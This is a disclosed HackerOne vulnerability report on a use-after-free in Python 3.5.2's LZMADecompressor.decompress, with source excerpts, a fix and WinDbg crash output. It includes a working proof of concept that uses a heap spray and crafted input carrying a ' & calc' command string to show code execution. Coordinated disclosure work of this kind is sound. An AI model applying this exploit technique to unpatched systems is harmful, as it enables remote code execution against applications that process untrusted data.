{"id":172562,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzI1NjI=","url":"https://hackerone.com/reports/172562","title":"LZMADecompressor.decompress Use After Free","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2016-09-28T05:25:11.429Z","submitted_at":"2016-09-28T05:25:11.429Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"johnleitch","url":"/johnleitch","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":27,"url":"https://hackerone.com/ibb-python","handle":"ibb-python","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/027/c46b79d4c73a7b34d61a717ed19ae719a0b67b2e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Python (IBB)","twitter_handle":"","website":"http://www.python.org/news/security","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-12-05T00:30:49.353Z","bug_reporter_agreed_on_going_public_at":"2016-12-04T06:09:28.268Z","team_member_agreed_on_going_public_at":"2016-12-05T00:30:49.274Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.\n\nhttps://bugs.python.org/issue28275\n\n---\n\nPython 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = \u0026d-\u003elzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs-\u003enext_in != NULL) {\n        [...]\n    }\n    else {\n        lzs-\u003enext_in = data;\n        lzs-\u003eavail_in = len;\n        input_buffer_in_use = 0;\n    }\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL)\n        return NULL;\n    [...]\n}\n\nWhen the function is first called, lzs-\u003enext_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs-\u003enext_in.\n\nA couple returns later, the allocation pointed to by lzs-\u003enext_in (data) is freed:\n\nstatic PyObject *\n_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)\n{\n    PyObject *return_value = NULL;\n    static char *_keywords[] = {\"data\", \"max_length\", NULL};\n    Py_buffer data = {NULL, NULL};\n    Py_ssize_t max_length = -1;\n\n    if (!PyArg_ParseTupleAndKeywords(args, kwargs, \"y*|n:decompress\", _keywords,\n        \u0026data, \u0026max_length))\n        goto exit;\n    return_value = _lzma_LZMADecompressor_decompress_impl(self, \u0026data, max_length);\n\nexit:\n    /* Cleanup for data */\n    if (data.obj)\n       PyBuffer_Release(\u0026data);\n\n    return return_value;\n}\n\n\nAt this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs-\u003enext_in pointer, and thus memory corruption.\n\nstatic PyObject *\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\n{\n    char input_buffer_in_use;\n    PyObject *result;\n    lzma_stream *lzs = \u0026d-\u003elzs;\n\n    /* Prepend unconsumed input if necessary */\n    if (lzs-\u003enext_in != NULL) {\n        size_t avail_now, avail_total;\n        [...]\n        memcpy((void*)(lzs-\u003enext_in + lzs-\u003eavail_in), data, len);\n        lzs-\u003eavail_in += len;\n        input_buffer_in_use = 1;\n    }\n    else {\n        [...]\n    }\n}\n\nThis vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.\n\nimport _lzma\nfrom array import *\n\n# System address when tested: 76064070\nd = _lzma.LZMADecompressor()\nspray = [];\nfor x in range(0, 0x700):\n    meg = bytearray(b'\\x76\\x70\\x40\\x06' * int(0x100000 / 4));        \n    spray.append(meg)\n\ndef foo():    \n    for x in range(0, 2):\n        try:\n            d.decompress(b\"\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\" * int(0x100 / (4*4)))\n        except:\n            pass\nfoo()\nprint(len(spray[0]))\nprint(len(spray))\n\n\nTo fix the issue, it is recommended that lzs-\u003enext_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.\n\n    result = decompress_buf(d, max_length);\n    if(result == NULL) {\n        lzs-\u003enext_in = 0;\n        return NULL;\n    }\n\n\nA repro file is attached as well.\n\nException details:\n\n0:000\u003e r\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n0:000\u003e k\nChildEBP RetAddr  \n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n009ef434 5d573383 _lzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 997]\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules\\_lzmamodule.c @ 1097]\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic\\_lzmamodule.c.h @ 99]\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n009ef984 1c84146d python_d!__scrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n009ef98c 1c8417a8 python_d!__scrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b\n0:000\u003e !heap -p -a edi\n    address 09275fe8 found in\n    _DPH_HEAP_ROOT @ 53a1000\n    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)\n                                    9182d68:          9275000             2000\n    5c949cd2 verifier!AVrfDebugPageHeapFree+0x000000c2\n    775be045 ntdll!RtlDebugFreeHeap+0x0000003c\n    7751cc3e ntdll!RtlpFreeHeap+0x00000c3e\n    7751b4c8 ntdll!RtlFreeHeap+0x00000268\n    591067a7 ucrtbased!free_base+0x00000027\n    5910394b ucrtbased!calloc_base+0x00000b5b\n    5910617c ucrtbased!free_dbg+0x0000007c\n    59106750 ucrtbased!free+0x00000010\n    55e781bd python35_d!_PyMem_RawFree+0x0000000d [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 90]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78434 python35_d!PyMem_RawFree+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 316]\n    55e77ad1 python35_d!_PyObject_Free+0x00000591 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1618]\n    55e77f32 python35_d!_PyMem_DebugFree+0x00000072 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 1892]\n    55e78724 python35_d!PyObject_Free+0x00000014 [c:\\source2\\python-3.5.2\\objects\\obmalloc.c @ 410]\n    55e02005 python35_d!bytes_dealloc+0x00000015 [c:\\source2\\python-3.5.2\\objects\\bytesobject.c @ 956]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55e922f7 python35_d!tupledealloc+0x000000c7 [c:\\source2\\python-3.5.2\\objects\\tupleobject.c @ 236]\n    55e75f73 python35_d!_Py_Dealloc+0x00000023 [c:\\source2\\python-3.5.2\\objects\\object.c @ 1786]\n    55f651a9 python35_d!call_function+0x000003f9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4707]\n    55f6008d python35_d!PyEval_EvalFrameEx+0x0000509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\n    55f6478d python35_d!_PyEval_EvalCodeWithName+0x0000073d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\n    55f5afbd python35_d!PyEval_EvalCodeEx+0x0000002d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\n    55f5af81 python35_d!PyEval_EvalCode+0x00000021 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\n    55fe67de python35_d!run_mod+0x0000003e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\n    55fe2daa python35_d!PyRun_FileExFlags+0x0000009a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\n    55fe3dac python35_d!PyRun_SimpleFileExFlags+0x000003ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\n    55fe2c5b python35_d!PyRun_AnyFileExFlags+0x0000006b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\n    55d39e6d python35_d!run_file+0x0000013d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\n    55d38821 python35_d!Py_Main+0x00000f01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\n    1c841331 python_d!wmain+0x00000011 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\n    1c84178e python_d!invoke_main+0x0000001e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\n    1c8415da python_d!__scrt_common_main_seh+0x0000015a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\n\n \n0:000\u003e !analyze -v -nodb\n*******************************************************************************\n*                                                                             *\n*                        Exception Analysis                                   *\n*                                                                             *\n*******************************************************************************\n\n\nFAULTING_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nEXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)\nExceptionAddress: 6bf55149 (VCRUNTIME140D!TrailingDownVec+0x000001f9)\n   ExceptionCode: c0000005 (Access violation)\n  ExceptionFlags: 00000000\nNumberParameters: 2\n   Parameter[0]: 00000001\n   Parameter[1]: 09275fe8\nAttempt to write to address 09275fe8\n\nCONTEXT:  00000000 -- (.cxr 0x0;r)\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\nVCRUNTIME140D!TrailingDownVec+0x1f9:\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\n\nFAULTING_THREAD:  000043fc\n\nDEFAULT_BUCKET_ID:  INVALID_POINTER_WRITE\n\nPROCESS_NAME:  python_d.exe\n\nERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.\n\nEXCEPTION_PARAMETER1:  00000001\n\nEXCEPTION_PARAMETER2:  09275fe8\n\nWRITE_ADDRESS:  09275fe8 \n\nFOLLOWUP_IP: \nVCRUNTIME140D!TrailingDownVec+1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\n6bf55149 8917            mov     dword ptr [edi],edx\n\nNTGLOBALFLAG:  2000000\n\nAPPLICATION_VERIFIER_FLAGS:  0\n\nAPP:  python_d.exe\n\nANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre\n\nPRIMARY_PROBLEM_CLASS:  INVALID_POINTER_WRITE\n\nBUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ\n\nLAST_CONTROL_TRANSFER:  from 5d573f80 to 6bf55149\n\nSTACK_TEXT:  \n009ef3e4 5d573f80 09275fe8 08b44970 0000000a VCRUNTIME140D!TrailingDownVec+0x1f9\n009ef434 5d573383 060e9f40 08b44970 0000000a _lzma_d!decompress+0x130\n009ef454 5d572049 060e9f40 009ef468 ffffffff _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93\n009ef49c 55e6dd40 060e9f40 079cec40 00000000 _lzma_d!_lzma_LZMADecompressor_decompress+0x79\n009ef4d4 55f65199 08b53db8 079cec40 00000000 python35_d!PyCFunction_Call+0x80\n009ef4fc 55f6008d 009ef540 079cec40 06143c78 python35_d!call_function+0x3e9\n009ef58c 55f6478d 06143c78 00000000 1c84114f python35_d!PyEval_EvalFrameEx+0x509d\n009ef5cc 55f5afbd 079eae60 06143c78 06171978 python35_d!_PyEval_EvalCodeWithName+0x73d\n009ef608 55f5af81 079eae60 06171978 06171978 python35_d!PyEval_EvalCodeEx+0x2d\n009ef63c 55fe67de 079eae60 06171978 06171978 python35_d!PyEval_EvalCode+0x21\n009ef660 55fe2daa 08db1470 08b4b168 06171978 python35_d!run_mod+0x3e\n009ef69c 55fe3dac 06e40fc0 079f30e0 00000101 python35_d!PyRun_FileExFlags+0x9a\n009ef730 55fe2c5b 06e40fc0 079f30e0 00000001 python35_d!PyRun_SimpleFileExFlags+0x3ec\n009ef74c 55d39e6d 06e40fc0 079f30e0 00000001 python35_d!PyRun_AnyFileExFlags+0x6b\n009ef7a0 55d38821 06e40fc0 06012fa6 009ef85c python35_d!run_file+0x13d\n009ef908 1c841331 00000002 06012f80 009ef92c python35_d!Py_Main+0xf01\n009ef918 1c84178e 00000002 06012f80 0601af40 python_d!wmain+0x11\n009ef92c 1c8415da 851961c5 1c84114f 1c84114f python_d!invoke_main+0x1e\n009ef984 1c84146d 009ef994 1c8417a8 009ef9a8 python_d!__scrt_common_main_seh+0x15a\n009ef98c 1c8417a8 009ef9a8 742438f4 006cd000 python_d!__scrt_common_main+0xd\n009ef994 742438f4 006cd000 742438d0 939c497b python_d!wmainCRTStartup+0x8\n009ef9a8 77545de3 006cd000 5080bb84 00000000 KERNEL32!BaseThreadInitThunk+0x24\n009ef9f0 77545dae ffffffff 7756b7d7 00000000 ntdll!__RtlUserThreadStart+0x2f\n009efa00 00000000 1c84114f 006cd000 00000000 ntdll!_RtlUserThreadStart+0x1b\n\n\nSTACK_COMMAND:  .cxr 0x0 ; kb\n\nFAULTING_SOURCE_LINE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_FILE:  f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm\n\nFAULTING_SOURCE_LINE_NUMBER:  658\n\nSYMBOL_STACK_INDEX:  0\n\nSYMBOL_NAME:  vcruntime140d!TrailingDownVec+1f9\n\nFOLLOWUP_NAME:  MachineOwner\n\nMODULE_NAME: VCRUNTIME140D\n\nIMAGE_NAME:  VCRUNTIME140D.dll\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  558ce3d5\n\nFAILURE_BUCKET_ID:  INVALID_POINTER_WRITE_c0000005_VCRUNTIME140D.dll!TrailingDownVec\n\nBUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_WRITE_INVALID_POINTER_READ_vcruntime140d!TrailingDownVec+1f9\n\nANALYSIS_SOURCE:  UM\n\nFAILURE_ID_HASH_STRING:  um:invalid_pointer_write_c0000005_vcruntime140d.dll!trailingdownvec\n\nFAILURE_ID_HASH:  {935a9c66-b210-2678-8c10-c746a999bfb6}\n\nFollowup: MachineOwner\n---------","vulnerability_information_html":"\u003cp\u003eI have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://bugs.python.org/issue28275\" href=\"/redirect?url=https%3A%2F%2Fbugs.python.org%2Fissue28275\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.python.org/issue28275\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003ePython 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.\u003c/p\u003e\n\n\u003cp\u003estatic PyObject *\u003cbr\u003e\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\u003cbr\u003e\n{\u003cbr\u003e\n    char input_buffer_in_use;\u003cbr\u003e\n    PyObject *result;\u003cbr\u003e\n    lzma_stream *lzs = \u0026amp;d-\u0026gt;lzs;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/* Prepend unconsumed input if necessary */\nif (lzs-\u0026gt;next_in != NULL) {\n    [...]\n}\nelse {\n    lzs-\u0026gt;next_in = data;\n    lzs-\u0026gt;avail_in = len;\n    input_buffer_in_use = 0;\n}\n\nresult = decompress_buf(d, max_length);\nif(result == NULL)\n    return NULL;\n[...]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eWhen the function is first called, lzs-\u0026gt;next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs-\u0026gt;next_in.\u003c/p\u003e\n\n\u003cp\u003eA couple returns later, the allocation pointed to by lzs-\u0026gt;next_in (data) is freed:\u003c/p\u003e\n\n\u003cp\u003estatic PyObject *\u003cbr\u003e\n_lzma_LZMADecompressor_decompress(Decompressor *self, PyObject *args, PyObject *kwargs)\u003cbr\u003e\n{\u003cbr\u003e\n    PyObject *return_value = NULL;\u003cbr\u003e\n    static char *_keywords[] = {\u0026quot;data\u0026quot;, \u0026quot;max_length\u0026quot;, NULL};\u003cbr\u003e\n    Py_buffer data = {NULL, NULL};\u003cbr\u003e\n    Py_ssize_t max_length = -1;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eif (!PyArg_ParseTupleAndKeywords(args, kwargs, \u0026quot;y*|n:decompress\u0026quot;, _keywords,\n    \u0026amp;data, \u0026amp;max_length))\n    goto exit;\nreturn_value = _lzma_LZMADecompressor_decompress_impl(self, \u0026amp;data, max_length);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eexit:\u003cbr\u003e\n    /* Cleanup for data */\u003cbr\u003e\n    if (data.obj)\u003cbr\u003e\n       PyBuffer_Release(\u0026amp;data);\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ereturn return_value;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eAt this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs-\u0026gt;next_in pointer, and thus memory corruption.\u003c/p\u003e\n\n\u003cp\u003estatic PyObject *\u003cbr\u003e\ndecompress(Decompressor *d, uint8_t *data, size_t len, Py_ssize_t max_length)\u003cbr\u003e\n{\u003cbr\u003e\n    char input_buffer_in_use;\u003cbr\u003e\n    PyObject *result;\u003cbr\u003e\n    lzma_stream *lzs = \u0026amp;d-\u0026gt;lzs;\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/* Prepend unconsumed input if necessary */\nif (lzs-\u0026gt;next_in != NULL) {\n    size_t avail_now, avail_total;\n    [...]\n    memcpy((void*)(lzs-\u0026gt;next_in + lzs-\u0026gt;avail_in), data, len);\n    lzs-\u0026gt;avail_in += len;\n    input_buffer_in_use = 1;\n}\nelse {\n    [...]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e}\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.\u003c/p\u003e\n\n\u003cp\u003eimport _lzma\u003cbr\u003e\nfrom array import *\u003c/p\u003e\n\n\u003ch1 id=\"system-address-when-tested-76064070\"\u003eSystem address when tested: 76064070\u003c/h1\u003e\n\n\u003cp\u003ed = _lzma.LZMADecompressor()\u003cbr\u003e\nspray = [];\u003cbr\u003e\nfor x in range(0, 0x700):\u003cbr\u003e\n    meg = bytearray(b\u0026#39;\\x76\\x70\\x40\\x06\u0026#39; * int(0x100000 / 4));\u003cbr\u003e\u003cbr\u003e\n    spray.append(meg)\u003c/p\u003e\n\n\u003cp\u003edef foo():\u003cbr\u003e\u003cbr\u003e\n    for x in range(0, 2):\u003cbr\u003e\n        try:\u003cbr\u003e\n            d.decompress(b\u0026quot;\\x20\\x26\\x20\\x63\\x61\\x6c\\x63\\x00\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\u0026quot; * int(0x100 / (4*4)))\u003cbr\u003e\n        except:\u003cbr\u003e\n            pass\u003cbr\u003e\nfoo()\u003cbr\u003e\nprint(len(spray[0]))\u003cbr\u003e\nprint(len(spray))\u003c/p\u003e\n\n\u003cp\u003eTo fix the issue, it is recommended that lzs-\u0026gt;next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eresult = decompress_buf(d, max_length);\nif(result == NULL) {\n    lzs-\u0026gt;next_in = 0;\n    return NULL;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eA repro file is attached as well.\u003c/p\u003e\n\n\u003cp\u003eException details:\u003c/p\u003e\n\n\u003cp\u003e0:000\u0026gt; r\u003cbr\u003e\neax=0000000a ebx=009ef540 ecx=00000002 edx=41414141 esi=08b44970 edi=09275fe8\u003cbr\u003e\neip=6bf55149 esp=009ef3e0 ebp=009ef434 iopl=0         nv up ei pl nz na po cy\u003cbr\u003e\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010203\u003cbr\u003e\nVCRUNTIME140D!TrailingDownVec+0x1f9:\u003cbr\u003e\n6bf55149 8917            mov     dword ptr [edi],edx  ds:002b:09275fe8=????????\u003cbr\u003e\n0:000\u0026gt; k\u003cbr\u003e\nChildEBP RetAddr\u003cbr\u003e\u003cbr\u003e\n009ef3e4 5d573f80 VCRUNTIME140D!TrailingDownVec+0x1f9 [f:\\dd\\vctools\\crt\\vcruntime\\src\\string\\i386\\memcpy.asm @ 658]\u003cbr\u003e\n009ef434 5d573383 \u003cu\u003elzma_d!decompress+0x130 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 997]\u003cbr\u003e\n009ef454 5d572049 _lzma_d!_lzma_LZMADecompressor_decompress_impl+0x93 [c:\\source2\\python-3.5.2\\modules_lzmamodule.c @ 1097]\u003cbr\u003e\n009ef49c 55e6dd40 _lzma_d!_lzma_LZMADecompressor_decompress+0x79 [c:\\source2\\python-3.5.2\\modules\\clinic_lzmamodule.c.h @ 99]\u003cbr\u003e\n009ef4d4 55f65199 python35_d!PyCFunction_Call+0x80 [c:\\source2\\python-3.5.2\\objects\\methodobject.c @ 98]\u003cbr\u003e\n009ef4fc 55f6008d python35_d!call_function+0x3e9 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4705]\u003cbr\u003e\n009ef58c 55f6478d python35_d!PyEval_EvalFrameEx+0x509d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 3238]\u003cbr\u003e\n009ef5cc 55f5afbd python35_d!_PyEval_EvalCodeWithName+0x73d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4018]\u003cbr\u003e\n009ef608 55f5af81 python35_d!PyEval_EvalCodeEx+0x2d [c:\\source2\\python-3.5.2\\python\\ceval.c @ 4039]\u003cbr\u003e\n009ef63c 55fe67de python35_d!PyEval_EvalCode+0x21 [c:\\source2\\python-3.5.2\\python\\ceval.c @ 777]\u003cbr\u003e\n009ef660 55fe2daa python35_d!run_mod+0x3e [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 976]\u003cbr\u003e\n009ef69c 55fe3dac python35_d!PyRun_FileExFlags+0x9a [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 929]\u003cbr\u003e\n009ef730 55fe2c5b python35_d!PyRun_SimpleFileExFlags+0x3ec [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 396]\u003cbr\u003e\n009ef74c 55d39e6d python35_d!PyRun_AnyFileExFlags+0x6b [c:\\source2\\python-3.5.2\\python\\pythonrun.c @ 80]\u003cbr\u003e\n009ef7a0 55d38821 python35_d!run_file+0x13d [c:\\source2\\python-3.5.2\\modules\\main.c @ 318]\u003cbr\u003e\n009ef908 1c841331 python35_d!Py_Main+0xf01 [c:\\source2\\python-3.5.2\\modules\\main.c @ 768]\u003cbr\u003e\n009ef918 1c84178e python_d!wmain+0x11 [c:\\source2\\python-3.5.2\\programs\\python.c @ 14]\u003cbr\u003e\n009ef92c 1c8415da python_d!invoke_main+0x1e [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 89]\u003cbr\u003e\n009ef984 1c84146d python_d!\u003c/u\u003e\u003cu\u003escrt_common_main_seh+0x15a [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 264]\u003cbr\u003e\n009ef98c 1c8417a8 python_d!\u003c/u\u003e\u003cu\u003escrt_common_main+0xd [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 309]\u003cbr\u003e\n009ef994 742438f4 python_d!wmainCRTStartup+0x8 [f:\\dd\\vctools\\crt\\vcstartup\\src\\startup\\exe_wmain.cpp @ 17]\u003cbr\u003e\n009ef9a8 77545de3 KERNEL32!BaseThreadInitThunk+0x24\u003cbr\u003e\n009ef9f0 77545dae ntdll!\u003c/u\u003e\u003cu\u003eRtlUserThreadStart+0x2f\u003cbr\u003e\n009efa00 00000000 ntdll!_RtlUserThreadStart+0x1b\u003cbr\u003e\n0:000\u0026gt; !heap -p -a edi\u003cbr\u003e\n    address 09275fe8 found in\u003cbr\u003e\n    _DPH_HEAP_ROOT @ 53a1000\u003cbr\u003e\n    in free-ed allocation (  DPH_HEAP_BLOCK:         